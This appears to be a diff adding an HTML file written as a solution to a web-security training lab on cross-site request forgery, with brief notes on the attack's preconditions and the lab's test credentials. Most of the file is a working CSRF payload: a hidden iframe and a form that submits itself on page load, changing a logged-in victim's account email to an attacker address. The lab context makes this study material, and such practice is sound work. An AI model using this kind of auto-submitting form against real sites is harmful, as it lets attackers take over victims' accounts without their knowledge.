@@ -1,0 +1,33 @@
+<html>
+    <body>
+        <!-- 
+            Lab #1 - CSRF (Cross-site request forgery) vulnerability with defenses
+
+            Vulnerable parameter - email change functionality
+
+            Goal - exploit the CSRF vulnerability and change the email address
+
+            credentials: wiener:peter
+
+            Analysis:
+
+            In orded for a CSRF attack to be possible:
+            - A relevant action - email change functionality
+            - Cookie based session handling - session cookie
+            - No unpredictable request parameters - satisfied
+
+            python3 -m http.server 5555
+            then I write in web browser 127.0.0.1:5555
+         -->
+
+        <h1>Hello World!</h1>
+        <iframe style="display:none" name="csrf-iframe"></iframe>
+        <form action="https://ac7d1f121f7a125dc0142e2700b0005e.web-security-academy.net/my-account/change-email" method="POST" target="csrf-iframe" id="csrf-form">
+            <input type="hidden" name="email" value="sarlot@hacker.com">
+        </form>
+
+        <script>
+            document.getElementById("csrf-form").submit()
+        </script>
+    </body>
+</html>
